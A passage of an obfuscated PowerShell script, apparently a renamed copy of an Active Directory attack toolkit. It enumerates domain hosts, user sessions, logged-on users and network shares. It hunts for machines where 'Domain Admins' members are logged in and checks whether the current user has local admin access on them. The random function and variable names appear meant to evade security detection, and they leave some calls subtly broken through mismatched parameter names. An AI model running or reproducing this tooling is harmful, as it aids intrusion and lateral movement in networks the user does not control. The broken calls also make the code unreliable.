    $cmd = "get-childitem $Path -rec $(if(-not $oyatszxc99){`"-Force`"}) -ErrorAction SilentlyContinue -include $($DXPOWHXa99 -join `",`") | where{ $(if($qWuauHEy99){`"(-not `$_.PSIsContainer) -and`"}) (`$_.LastAccessTime -gt `"$rlhLsJBJ99`") -and (`$_.LastWriteTime -gt `"$beHpfBFb99`") -and (`$_.CreationTime -gt `"$TnvLvEKe99`")} | select-object FullName,@{Name='Owner';Expression={(Get-Acl `$_.FullName).Owner}},LastAccessTime,LastWriteTime,Length $(if($qlDFbOCS99){`"| where { `$_.FullName } | where { freebees -Path `$_.FullName }`"}) $(if($JeGOQmAv99){`"| export-csv -zUlyMMyD99 -notypeinformation -path $JeGOQmAv99`"})"
    
    Invoke-Expression $cmd
}
function Dave {
    
    [CmdletBinding()]
    param(
        [string]
        $uVOoDBse99 = 'localhost'
    )
    
    If ($PSBoundParameters['Debug']) {
        $vPuRmPba99 = 'Continue'
    }
    
    $ODxasNYT99 = $wyLERStH99::OpenSCManagerW("\\$uVOoDBse99", 'ServicesActive', 0xF003F)
    Write-Debug "Dave handle: $ODxasNYT99"
    
    if ($ODxasNYT99 -ne 0){
        $wyLERStH99::CloseServiceHandle($ODxasNYT99) | Out-Null
        $true
    }
    else{
        $err = $Kernel32::GetLastError()
        Write-Debug "Dave LastError: $err"
        $false
    }
}
function classifications {
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,
        [string]
        $nMIWdEkf99,
        [string]
        $HGrbOFdX99,
        [Switch] 
        $jnQGBcRe99,
        [Switch] 
        $pyDUmTaM99,
        [Switch] 
        $UfipYUon99,
        [UInt32]
        $Delay = 0,
        [double]
        $OTbZbzgr99 = .3,
        [string]
        $dOCGgZVW99
    )
    
    begin {
        If ($PSBoundParameters['Debug']) {
            $vPuRmPba99 = 'Continue'
        }
        
        $lxaLbpar99 = @('', "ADMIN$", "IPC$", "C$", "PRINT$")
        
        if($dOCGgZVW99){
            $rYtPqZdr99 = $dOCGgZVW99
        }
        else{
            $rYtPqZdr99 = $null
        }
        
        $wmnsBtCQ99 = New-Object System.Random
        $iyhvNPNI99 = ([Environment]::UserName).toLower()
        
        "Running Netview with delay of $Delay"
        if ($rYtPqZdr99){
            "[*] Domain: $rYtPqZdr99"
        }
        
        if($nMIWdEkf99){
            if (Test-Path -Path $nMIWdEkf99){
                $Hosts = Get-Content -Path $nMIWdEkf99
            }
            else{
                Write-Warning "[!] Input file '$nMIWdEkf99' doesn't exist!"
                "[!] Input file '$nMIWdEkf99' doesn't exist!"
                return
            }
        }
        elseif($HGrbOFdX99){
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts with filter '$HGrbOFdX99'`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99 -uVOoDBse99 $HGrbOFdX99
        }
        $EhqNlbqS99 = popularly -dOCGgZVW99 $rYtPqZdr99
        
        if (($EhqNlbqS99 -ne $null) -and ($EhqNlbqS99.count -ne 0)){
            foreach ($DC in $EhqNlbqS99){
                "[+] Domain Controller: $DC"
            }
        }
    }
    process {
        
        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts...`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99
        }
        
        $Hosts = supernovae $Hosts
        $sczGJifQ99 = $Hosts.Count
        "[*] Total number of hosts: $sczGJifQ99`r`n"
 
        $BzMQEsAu99 = 0
        
        foreach ($LxIyYIwe99 in $Hosts){
            
            $BzMQEsAu99 = $BzMQEsAu99 + 1
            
            if (($LxIyYIwe99 -ne $null) -and ($LxIyYIwe99.trim() -ne '')){
                
                $ip = deltas -uVOoDBse99 $LxIyYIwe99
                
                if ($ip -ne ''){
                    Start-Sleep -Seconds $wmnsBtCQ99.Next((1-$OTbZbzgr99)*$Delay, (1+$OTbZbzgr99)*$Delay)
                    
                    Write-Verbose "[*] Enumerating server $LxIyYIwe99 ($BzMQEsAu99 of $($Hosts.count))"
                    "`r`n[+] Server: $LxIyYIwe99"
                    "[+] IP: $ip"
                    
                    $up = $true
                    if(-not $UfipYUon99){
                        $up = disorganize -LxIyYIwe99 $LxIyYIwe99
                    }
                    if ($up){
                        
                        $GvlpoKNj99 = swagged -uVOoDBse99 $LxIyYIwe99
                        foreach ($ddqEcwGf99 in $GvlpoKNj99) {
                            $EOQyLHjF99 = $ddqEcwGf99.sesi10_username
                            $cname = $ddqEcwGf99.sesi10_cname
                            $vhYWUsCi99 = $ddqEcwGf99.sesi10_time
                            $FmOpRXrU99 = $ddqEcwGf99.sesi10_idle_time
                            if (($EOQyLHjF99 -ne $null) -and ($EOQyLHjF99.trim() -ne '') -and ($EOQyLHjF99.trim().toLower() -ne $iyhvNPNI99)){
                                "[+] $LxIyYIwe99 - Session - $EOQyLHjF99 from $cname - Active: $vhYWUsCi99 - Idle: $FmOpRXrU99"
                            }
                        }
                        
                        $users = Pentecost -uVOoDBse99 $LxIyYIwe99
                        foreach ($user in $users) {
                            $EOQyLHjF99 = $user.wkui1_username
                            $dOCGgZVW99 = $user.wkui1_logon_domain
                            
                            if ($EOQyLHjF99 -ne $null){
                                if ( !$EOQyLHjF99.EndsWith("$") ) {
                                    "[+] $LxIyYIwe99 - Logged-on - $dOCGgZVW99\\$EOQyLHjF99"
                                }
                            }
                        }
                        
                        $bphkWboz99 = Carly -uVOoDBse99 $LxIyYIwe99
                        foreach ($share in $bphkWboz99) {
                            if ($share -ne $null){
                                $sGWzjfsu99 = $share.shi1_netname
                                $ITkhsIQD99 = $share.shi1_remark
                                $path = '\\'+$LxIyYIwe99+'\'+$sGWzjfsu99
                                
                                if ($jnQGBcRe99){
                                    if (($sGWzjfsu99) -and ($sGWzjfsu99.trim() -ne '') -and ($lxaLbpar99 -notcontains $sGWzjfsu99)){
                                        
                                        if($pyDUmTaM99){
                                            try{
                                                $f=[IO.Directory]::GetFiles($path)
                                                "[+] $LxIyYIwe99 - Share: $sGWzjfsu99 `t: $ITkhsIQD99"
                                            }
                                            catch {}
                                            
                                        }
                                        else{
                                            "[+] $LxIyYIwe99 - Share: $sGWzjfsu99 `t: $ITkhsIQD99"
                                        }
                                        
                                    }  
                                }
                                else {
                                    if (($sGWzjfsu99) -and ($sGWzjfsu99.trim() -ne '')){
                                        
                                        if($pyDUmTaM99){
                                            try{
                                                $f=[IO.Directory]::GetFiles($path)
                                                "[+] $LxIyYIwe99 - Share: $sGWzjfsu99 `t: $ITkhsIQD99"
                                            }
                                            catch {}
                                        }
                                        else{
                                            "[+] $LxIyYIwe99 - Share: $sGWzjfsu99 `t: $ITkhsIQD99"
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
function falters {
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,
        [string]
        $nMIWdEkf99,
        [string]
        $HGrbOFdX99,
        [string[]]
        $lxaLbpar99,
        [Switch] 
        $pyDUmTaM99,
        [Switch] 
        $UfipYUon99,
        [string]
        $dOCGgZVW99,
        [Int]
        $sPSLbcro99 = 10
    )
    
    begin {
        If ($PSBoundParameters['Debug']) {
            $vPuRmPba99 = 'Continue'
        }
        
        if($dOCGgZVW99){
            $rYtPqZdr99 = $dOCGgZVW99
        }
        else{
            $rYtPqZdr99 = $null
        }
        
        $iyhvNPNI99 = ([Environment]::UserName).toLower()
        
        "Running Netview with delay of $Delay"
        if($rYtPqZdr99){
            "[*] Domain: $rYtPqZdr99"
        }
        
        if($nMIWdEkf99){
            if (Test-Path -Path $nMIWdEkf99){
                $Hosts = Get-Content -Path $nMIWdEkf99
            }
            else{
                Write-Warning "[!] Input file '$nMIWdEkf99' doesn't exist!"
                "[!] Input file '$nMIWdEkf99' doesn't exist!"
                return
            }
        }
        elseif($HGrbOFdX99){
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts with filter '$HGrbOFdX99'`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99 -uVOoDBse99 $HGrbOFdX99
        }
        
        $iATbdRnY99 = {
            param($LxIyYIwe99, $Ping, $pyDUmTaM99, $lxaLbpar99)
            $ip = deltas -uVOoDBse99 $LxIyYIwe99
            if ($ip -ne ''){
                $up = $true
                if($Ping){
                    $up = disorganize -LxIyYIwe99 $LxIyYIwe99
                }
                if($up){
                    "`r`n[+] Server: $LxIyYIwe99"
                    "[+] IP: $ip"
                    
                    $GvlpoKNj99 = swagged -uVOoDBse99 $LxIyYIwe99
                    foreach ($ddqEcwGf99 in $GvlpoKNj99) {
                        $EOQyLHjF99 = $ddqEcwGf99.sesi10_username
                        $cname = $ddqEcwGf99.sesi10_cname
                        $vhYWUsCi99 = $ddqEcwGf99.sesi10_time
                        $FmOpRXrU99 = $ddqEcwGf99.sesi10_idle_time
                        if (($EOQyLHjF99 -ne $null) -and ($EOQyLHjF99.trim() -ne '') -and ($EOQyLHjF99.trim().toLower() -ne $iyhvNPNI99)){
                            "[+] $LxIyYIwe99 - Session - $EOQyLHjF99 from $cname - Active: $vhYWUsCi99 - Idle: $FmOpRXrU99"
                        }
                    }
                    
                    $users = Pentecost -uVOoDBse99 $LxIyYIwe99
                    foreach ($user in $users) {
                        $EOQyLHjF99 = $user.wkui1_username
                        $dOCGgZVW99 = $user.wkui1_logon_domain
                        
                        if ($EOQyLHjF99 -ne $null){
                            if ( !$EOQyLHjF99.EndsWith("$") ) {
                                "[+] $LxIyYIwe99 - Logged-on - $dOCGgZVW99\\$EOQyLHjF99"
                            }
                        }
                    }
                    
                    $bphkWboz99 = Carly -uVOoDBse99 $LxIyYIwe99
                    foreach ($share in $bphkWboz99) {
                        if ($share -ne $null){
                            $sGWzjfsu99 = $share.shi1_netname
                            $ITkhsIQD99 = $share.shi1_remark
                            $path = '\\'+$LxIyYIwe99+'\'+$sGWzjfsu99
                            
                            if ($MxNMgBai99){
                                if (($sGWzjfsu99) -and ($sGWzjfsu99.trim() -ne '') -and ($lxaLbpar99 -notcontains $sGWzjfsu99)){
                                    
                                    if($pyDUmTaM99){
                                        try{
                                            $f=[IO.Directory]::GetFiles($path)
                                            "[+] $LxIyYIwe99 - Share: $sGWzjfsu99 `t: $ITkhsIQD99"
                                        }
                                        catch {}
                                        
                                    }
                                    else{
                                        "[+] $LxIyYIwe99 - Share: $sGWzjfsu99 `t: $ITkhsIQD99"
                                    }
                                    
                                }  
                            }
                            else {
                                if (($sGWzjfsu99) -and ($sGWzjfsu99.trim() -ne '')){
                                    
                                    if($pyDUmTaM99){
                                        try{
                                            $f=[IO.Directory]::GetFiles($path)
                                            "[+] $LxIyYIwe99 - Share: $sGWzjfsu99 `t: $ITkhsIQD99"
                                        }
                                        catch {}
                                    }
                                    else{
                                        "[+] $LxIyYIwe99 - Share: $sGWzjfsu99 `t: $ITkhsIQD99"
                                    }
                                }
                            }
                            
                        }
                    }            
                }
            }
        }
        $ZQLNnLLm99 = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $ZQLNnLLm99.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
     
        $SMmnrEFb99 = Get-Variable -Scope 1
     
        $dUtpewzr99 = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")
     
        ForEach($Var in $SMmnrEFb99) {
            If($dUtpewzr99 -notcontains $Var.Name) {
            $ZQLNnLLm99.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
            }
        }
        ForEach($ayushNav99 in (Get-ChildItem Function:)) {
            $ZQLNnLLm99.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $ayushNav99.Name, $ayushNav99.Definition))
        }
     
        $BzMQEsAu99 = 0
        $pool = [runspacefactory]::CreateRunspacePool(1, $sPSLbcro99, $ZQLNnLLm99, $host)
        $pool.Open()
        $jobs = @()   
        $ps = @()   
        $wait = @()
        $EhqNlbqS99 = popularly -dOCGgZVW99 $rYtPqZdr99
        
        if (($EhqNlbqS99 -ne $null) -and ($EhqNlbqS99.count -ne 0)){
            foreach ($DC in $EhqNlbqS99){
                "[+] Domain Controller: $DC"
            }
        }
        $BzMQEsAu99 = 0
    }
    process {
        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts...`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99
        }
        
        $Hosts = supernovae $Hosts
        $sczGJifQ99 = $Hosts.Count
        "[*] Total number of hosts: $sczGJifQ99`r`n"
        foreach ($LxIyYIwe99 in $Hosts){
            
            $BzMQEsAu99 = $BzMQEsAu99 + 1
            if ($LxIyYIwe99 -ne ''){
                Write-Verbose "[*] Enumerating server $LxIyYIwe99 ($BzMQEsAu99 of $($Hosts.count))"
                While ($($pool.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -milliseconds 500
                }
        
                $ps += [powershell]::create()
       
                $ps[$BzMQEsAu99].runspacepool = $pool
                [void]$ps[$BzMQEsAu99].AddScript($iATbdRnY99).AddParameter('Server', $LxIyYIwe99).AddParameter('Ping', -not $UfipYUon99).AddParameter('CheckShareAccess', $pyDUmTaM99).AddParameter('ExcludedShares', $lxaLbpar99)
        
                $jobs += $ps[$BzMQEsAu99].BeginInvoke();
         
                $wait += $jobs[$BzMQEsAu99].AsyncWaitHandle
            }
        }
    }
    end {
        Write-Verbose "Waiting for scanning threads to finish..."
        $VKYYmkzK99 = Get-Date
        while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $VKYYmkzK99).totalSeconds) -gt 60) {
                Start-Sleep -milliseconds 500
            } 
        for ($y = 0; $y -lt $BzMQEsAu99; $y++) {     
            try {   
                $ps[$y].EndInvoke($jobs[$y])   
            } catch {
                Write-Warning "error: $_"  
            }
            finally {
                $ps[$y].Dispose()
            }    
        }
        $pool.Dispose()
    }
}
function interlarding {
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,
        [Switch] 
        $yCkycaiS99,    
        [Switch] 
        $UfipYUon99,
        [UInt32]
        $Delay = 0,
        [double]
        $OTbZbzgr99 = .3,
        [string]
        $nMIWdEkf99,
        [Switch]
        $jQtYlnNa99,
        [string]
        $HGrbOFdX99,
        [string]
        $dOCGgZVW99
    )
    
    begin {
        If ($PSBoundParameters['Debug']) {
            $vPuRmPba99 = 'Continue'
        }
        
        if($dOCGgZVW99){
            $rYtPqZdr99 = $dOCGgZVW99
        }
        else{
            $rYtPqZdr99 = $null
        }
        
        Write-Verbose "[*] Running interlarding with delay of $delay"
        if($rYtPqZdr99){
            Write-Verbose "[*] Domain: $rYtPqZdr99"
        }
        $wmnsBtCQ99 = New-Object System.Random
        $iyhvNPNI99 = ([Environment]::UserName).toLower()
        
        if($nMIWdEkf99){
            if (Test-Path -Path $nMIWdEkf99){
                $hosts = Get-Content -Path $nMIWdEkf99
            }
            else{
                Write-Warning "[!] Input file '$nMIWdEkf99' doesn't exist!"
                return
            }
        }
        elseif($jQtYlnNa99){
            $Hosts  = Teller -dOCGgZVW99 $rYtPqZdr99
        }
        elseif($HGrbOFdX99){
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts with filter '$HGrbOFdX99'`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99 -uVOoDBse99 $HGrbOFdX99
        }
    }
    
    process{
        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts...`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99
        }
        
        $Hosts = supernovae $Hosts
        $sczGJifQ99 = $Hosts.Count
        Write-Verbose "[*] Total number of hosts: $sczGJifQ99`r`n"     
        $BzMQEsAu99 = 0
        
        foreach ($LxIyYIwe99 in $Hosts){
            
            $BzMQEsAu99 = $BzMQEsAu99 + 1
            
            if (($LxIyYIwe99 -ne $null) -and ($LxIyYIwe99.trim() -ne '')){
                
                $ip = deltas -uVOoDBse99 $LxIyYIwe99
                
                if ($ip -ne ''){
                    Start-Sleep -Seconds $wmnsBtCQ99.Next((1-$OTbZbzgr99)*$Delay, (1+$OTbZbzgr99)*$Delay)
                    
                    Write-Verbose "[*] Enumerating server $LxIyYIwe99 ($BzMQEsAu99 of $($Hosts.count))"
                    $up = $true
                    if(-not $UfipYUon99){
                        $up = disorganize -LxIyYIwe99 $LxIyYIwe99
                    }
                    if ($up){
                        
                        $GvlpoKNj99 = swagged -uVOoDBse99 $LxIyYIwe99
                        foreach ($ddqEcwGf99 in $GvlpoKNj99) {
                            $EOQyLHjF99 = $ddqEcwGf99.sesi10_username
                            $cname = $ddqEcwGf99.sesi10_cname
                            $vhYWUsCi99 = $ddqEcwGf99.sesi10_time
                            $FmOpRXrU99 = $ddqEcwGf99.sesi10_idle_time
                            if (($EOQyLHjF99 -ne $null) -and ($EOQyLHjF99.trim() -ne '') -and ($EOQyLHjF99.trim().toLower() -ne $iyhvNPNI99)){
                                "[+] $LxIyYIwe99 - Session - $EOQyLHjF99 from $cname - Active: $vhYWUsCi99 - Idle: $FmOpRXrU99"
                            }
                        }
                        
                        if (-not $yCkycaiS99){
                            $users = Pentecost -uVOoDBse99 $LxIyYIwe99
                            foreach ($user in $users) {
                                $EOQyLHjF99 = $user.wkui1_username
                                $dOCGgZVW99 = $user.wkui1_logon_domain
                                
                                if ($EOQyLHjF99 -ne $null){
                                    if ( !$EOQyLHjF99.EndsWith("$") ) {
                                        "[+] $LxIyYIwe99 - Logged-on - $dOCGgZVW99\\$EOQyLHjF99"
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
function dingiest {
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,
        [string]
        $nMIWdEkf99,
        [string]
        $HGrbOFdX99,
        [string]
        $YrweeofD99 = 'Domain Admins',
        [string]
        $OU,
        [string]
        $MBVLzigF99,
        [string]
        $EOQyLHjF99,
        [Switch]
        $oErmiNrs99,
        [Switch]
        $UfipYUon99,
        [UInt32]
        $Delay = 0,
        [double]
        $OTbZbzgr99 = .3,
        [string]
        $wdyyUevv99,
        [string]
        $dOCGgZVW99
    )
    
    begin {
        if ($PSBoundParameters['Debug']) {
            $vPuRmPba99 = 'Continue'
        }
        
        $UudCbJdN99 = @()
        
        $wmnsBtCQ99 = New-Object System.Random
        
        $iyhvNPNI99 = overshare
        $tyhSgetj99 = ([Environment]::UserName).toLower()
        
        if($dOCGgZVW99){
            $rYtPqZdr99 = $dOCGgZVW99
        }
        else{
            $rYtPqZdr99 = $null
        }
        
        "[*] Running dingiest with delay of $Delay"
        if($rYtPqZdr99){
            "[*] Domain: $rYtPqZdr99"
        }
        
        if($nMIWdEkf99){
            if (Test-Path -Path $nMIWdEkf99){
                $Hosts = Get-Content -Path $nMIWdEkf99
            }
            else{
                Write-Warning "[!] Input file '$nMIWdEkf99' doesn't exist!"
                "[!] Input file '$nMIWdEkf99' doesn't exist!"
                return
            }
        }
        elseif($HGrbOFdX99){
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts with filter '$HGrbOFdX99'`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99 -uVOoDBse99 $HGrbOFdX99
        }
        if ($EOQyLHjF99){
            "`r`n[*] Using target user '$EOQyLHjF99'..."
            $UudCbJdN99 += $EOQyLHjF99.ToLower()
        }
        elseif($OU){
            $UudCbJdN99 = bounciest -OU $OU | ForEach-Object {$_.samaccountname}
        }
        elseif($MBVLzigF99){
            $UudCbJdN99 = bounciest -MBVLzigF99 $MBVLzigF99 | ForEach-Object {$_.samaccountname}
        }
        elseif($wdyyUevv99){
            $UudCbJdN99 = @()
            if (Test-Path -Path $wdyyUevv99){
                $UudCbJdN99 = Get-Content -Path $wdyyUevv99 
            }
            else {
                Write-Warning "`r`n[!] Input file '$wdyyUevv99' doesn't exist!`r`n"
                "`r`n[!] Input file '$wdyyUevv99' doesn't exist!`r`n"
                return
            }
        }
        else{
            "`r`n[*] Querying domain group '$YrweeofD99' for target users..."
            $temp = compelling -YrweeofD99 $YrweeofD99 -dOCGgZVW99 $rYtPqZdr99
            $UudCbJdN99 = $temp | ForEach-Object {$_.ToLower() }
        }
        if (($UudCbJdN99 -eq $null) -or ($UudCbJdN99.Count -eq 0)){
            Write-Warning "`r`n[!] No users found to search for!"
            return
        }
    }
    
    process {
        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts...`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99
        }
        
        $Hosts = supernovae $Hosts
        $sczGJifQ99 = $Hosts.Count
         "[*] Total number of hosts: $sczGJifQ99`r`n"
        $BzMQEsAu99 = 0
        foreach ($LxIyYIwe99 in $Hosts){
            $BzMQEsAu99 = $BzMQEsAu99 + 1
            if ($LxIyYIwe99 -ne ''){
                Start-Sleep -Seconds $wmnsBtCQ99.Next((1-$OTbZbzgr99)*$Delay, (1+$OTbZbzgr99)*$Delay)
                
                Write-Verbose "[*] Enumerating server $LxIyYIwe99 ($BzMQEsAu99 of $($Hosts.count))"
                
                $up = $true
                if(-not $UfipYUon99){
                    $up = disorganize -LxIyYIwe99 $LxIyYIwe99
                }
                if ($up){
                    $GvlpoKNj99 = swagged -uVOoDBse99 $LxIyYIwe99
                    foreach ($ddqEcwGf99 in $GvlpoKNj99) {
                        $EOQyLHjF99 = $ddqEcwGf99.sesi10_username
                        $cname = $ddqEcwGf99.sesi10_cname
                        $vhYWUsCi99 = $ddqEcwGf99.sesi10_time
                        $FmOpRXrU99 = $ddqEcwGf99.sesi10_idle_time
                        
                        if (($EOQyLHjF99 -ne $null) -and ($EOQyLHjF99.trim() -ne '') -and ($EOQyLHjF99.trim().toLower() -ne $tyhSgetj99)){
                            if ($UudCbJdN99 -contains $EOQyLHjF99){
                                $ip = deltas -uVOoDBse99 $LxIyYIwe99
                                "[+] Target user '$EOQyLHjF99' has a session on $LxIyYIwe99 ($ip) from $cname"
                                
                                if ($oErmiNrs99){
                                    if (Dave -Hostname $cname){
                                        "[+] Current user '$iyhvNPNI99' has local admin access on $cname !"
                                    }
                                }
                            }
                        }
                    }
                    
                    $users = Pentecost -uVOoDBse99 $LxIyYIwe99
                    foreach ($user in $users) {
                        $EOQyLHjF99 = $user.wkui1_username
                        $dOCGgZVW99 = $user.wkui1_logon_domain
                        
                        if (($EOQyLHjF99 -ne $null) -and ($EOQyLHjF99.trim() -ne '')){
                            if ($UudCbJdN99 -contains $EOQyLHjF99){
                                $ip = deltas -uVOoDBse99 $LxIyYIwe99
                                "[+] Target user '$EOQyLHjF99' logged into $LxIyYIwe99 ($ip)"
                                
                                if ($oErmiNrs99){
                                    if (Dave -Hostname $ip){
                                        "[+] Current user '$iyhvNPNI99' has local admin access on $ip !"
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
function sallied {
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,
        [string]
        $YrweeofD99 = 'Domain Admins',
        [string]
        $OU,
        [string]
        $MBVLzigF99,
        [string]
        $EOQyLHjF99,
        [Switch]
        $oErmiNrs99,
        [Switch]
        $UfipYUon99,
        [string]
        $nMIWdEkf99,
        [string]
        $HGrbOFdX99,
        [string]
        $wdyyUevv99,
        [string]
        $dOCGgZVW99,
        [int]
        $sPSLbcro99 = 10
    )
    
    begin {
        if ($PSBoundParameters['Debug']) {
            $vPuRmPba99 = 'Continue'
        }
        
        $UudCbJdN99 = @()
        
        $iyhvNPNI99 = overshare
        $tyhSgetj99 = ([Environment]::UserName).toLower()
        
        if($dOCGgZVW99){
            $rYtPqZdr99 = $dOCGgZVW99
        }
        else{
            $rYtPqZdr99 = $null
        }
        
        "[*] Running sallied with delay of $Delay"
        if($rYtPqZdr99){
            "[*] Domain: $rYtPqZdr99"
        }
        if($nMIWdEkf99){
            if (Test-Path -Path $nMIWdEkf99){
                $Hosts = Get-Content -Path $nMIWdEkf99
            }
            else{
                Write-Warning "[!] Input file '$nMIWdEkf99' doesn't exist!"
                "[!] Input file '$nMIWdEkf99' doesn't exist!"
                return
            }
        }
        elseif($HGrbOFdX99){
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts with filter '$HGrbOFdX99'`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99 -uVOoDBse99 $HGrbOFdX99
        }
        
        if ($EOQyLHjF99){
            "`r`n[*] Using target user '$EOQyLHjF99'..."
            $UudCbJdN99 += $EOQyLHjF99.ToLower()
        }
        elseif($OU){
            $UudCbJdN99 = bounciest -OU $OU | ForEach-Object {$_.samaccountname}
        }
        elseif($MBVLzigF99){
            $UudCbJdN99 = bounciest -MBVLzigF99 $MBVLzigF99 | ForEach-Object {$_.samaccountname}
        }
        elseif($wdyyUevv99){
            $UudCbJdN99 = @()
            if (Test-Path -Path $wdyyUevv99){
                $UudCbJdN99 = Get-Content -Path $wdyyUevv99 
            }
            else {
                Write-Warning "`r`n[!] Input file '$wdyyUevv99' doesn't exist!`r`n"
                return
            }
        }
        else{
            "`r`n[*] Querying domain group '$YrweeofD99' for target users..."
            $temp = compelling -YrweeofD99 $YrweeofD99 -dOCGgZVW99 $rYtPqZdr99
            $UudCbJdN99 = $temp | ForEach-Object {$_.ToLower() }
        }
        
        if (($UudCbJdN99 -eq $null) -or ($UudCbJdN99.Count -eq 0)){
            Write-Warning "`r`n[!] No users found to search for!"
            return $Null
        }
        $iATbdRnY99 = {
            param($LxIyYIwe99, $Ping, $UudCbJdN99, $iyhvNPNI99, $tyhSgetj99)
            $up = $true
            if($Ping){
                $up = disorganize -LxIyYIwe99 $LxIyYIwe99
            }
            if($up){
                $GvlpoKNj99 = swagged -uVOoDBse99 $LxIyYIwe99
                foreach ($ddqEcwGf99 in $GvlpoKNj99) {
                    $EOQyLHjF99 = $ddqEcwGf99.sesi10_username
                    $cname = $ddqEcwGf99.sesi10_cname
                    $vhYWUsCi99 = $ddqEcwGf99.sesi10_time
                    $FmOpRXrU99 = $ddqEcwGf99.sesi10_idle_time
                    
                    if (($EOQyLHjF99 -ne $null) -and ($EOQyLHjF99.trim() -ne '') -and ($EOQyLHjF99.trim().toLower() -ne $tyhSgetj99)){
                        if ($UudCbJdN99 -contains $EOQyLHjF99){
                            $ip = deltas -uVOoDBse99 $LxIyYIwe99
                            "[+] Target user '$EOQyLHjF99' has a session on $LxIyYIwe99 ($ip) from $cname"
                            
                            if ($oErmiNrs99){
                                if (Dave -Hostname $cname){
                                    "[+] Current user '$iyhvNPNI99' has local admin access on $cname !"
                                }
                            }
                        }
                    }
                }
                
                $users = Pentecost -uVOoDBse99 $LxIyYIwe99
                foreach ($user in $users) {
                    $EOQyLHjF99 = $user.wkui1_username
                    $dOCGgZVW99 = $user.wkui1_logon_domain
                    
                    if (($EOQyLHjF99 -ne $null) -and ($EOQyLHjF99.trim() -ne '')){
                        if ($UudCbJdN99 -contains $EOQyLHjF99){
                            $ip = deltas -uVOoDBse99 $LxIyYIwe99
                            "[+] Target user '$EOQyLHjF99' logged into $LxIyYIwe99 ($ip)"
                            
                            if ($oErmiNrs99){
                                if (Dave -Hostname $ip){
                                    "[+] Current user '$iyhvNPNI99' has local admin access on $ip !"
                                }
                            }
                        }
                    }
                }
            }
        }
        $ZQLNnLLm99 = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $ZQLNnLLm99.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
     
        $SMmnrEFb99 = Get-Variable -Scope 1
     
        $dUtpewzr99 = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")
     
        ForEach($Var in $SMmnrEFb99) {
            If($dUtpewzr99 -notcontains $Var.Name) {
            $ZQLNnLLm99.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
            }
        }
        ForEach($ayushNav99 in (Get-ChildItem Function:)) {
            $ZQLNnLLm99.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $ayushNav99.Name, $ayushNav99.Definition))
        }
     
        $pool = [runspacefactory]::CreateRunspacePool(1, $sPSLbcro99, $ZQLNnLLm99, $host)
        $pool.Open()
        $jobs = @()   
        $ps = @()   
        $wait = @()
        $BzMQEsAu99 = 0
    }
    process {
        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts...`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99
        }
        
        $Hosts = supernovae $Hosts
        $sczGJifQ99 = $Hosts.Count
